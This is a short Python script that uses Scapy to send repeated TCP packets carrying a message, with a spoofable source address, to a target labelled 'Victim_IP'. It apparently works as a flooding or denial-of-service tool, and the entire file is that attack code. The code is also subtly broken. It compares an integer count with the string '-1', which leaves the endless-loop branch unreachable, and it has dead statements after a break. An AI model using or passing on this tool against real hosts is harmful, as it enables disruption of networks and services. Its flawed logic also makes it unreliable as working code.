def run(Source_IP: str, Victim_IP: str, Source_Port: int, Victim_Port: int, Count: int, Message: str):
    print("Scapy Needs Administrator Permission")
    from scapy.all import sendp as Send, TCP as tcp, IP as ip
    import scapy.all
    from time import sleep as Sleep

    if Count != "-1":
        print("Press Ctrl + C To Stop The Process")
        for i in range(0, Count):
            try:
                IP = ip(src=Source_IP, dst=Victim_IP)
                TCP = tcp(sport=Source_Port, dport=Victim_Port)
                Packet = IP / TCP / Message
                Send(Packet)
                print(
                    "Send Packet To Target {} from IP {} And Port {} To Port {}".format(
                        Victim_IP, Source_IP, Source_Port, Victim_Port))
            except KeyboardInterrupt:
                print(
                    "Already Send {} Packets To Target {} from IP {} And Port {} To Port {}".format(
                        i, Victim_IP, Source_IP, Source_Port, Victim_Port))
                break
                Sleep(2)
                raise SystemExit
    else:
        print("Press Ctrl + C To Stop The Process")
        i = 0
        while True:
            try:
                IP = ip(src=Source_IP, dst=Victim_IP)
                TCP = tcp(sport=Source_Port, dport=Victim_Port)
                Packet = IP / TCP / Message
                Send(Packet)
                print(
                    "Send Packet To Target {} from IP {} And Port {} To Port {}".format(
                        Victim_IP, Source_IP, Source_Port, Victim_Port))
                i += 1
            except KeyboardInterrupt:
                print(
                    "Already Send {} Packets To Target {} from IP {} And Port {} To Port {}".format(
                        i, Victim_IP, Source_IP, Source_Port, Victim_Port))
                Sleep(2)
                raise SystemExit
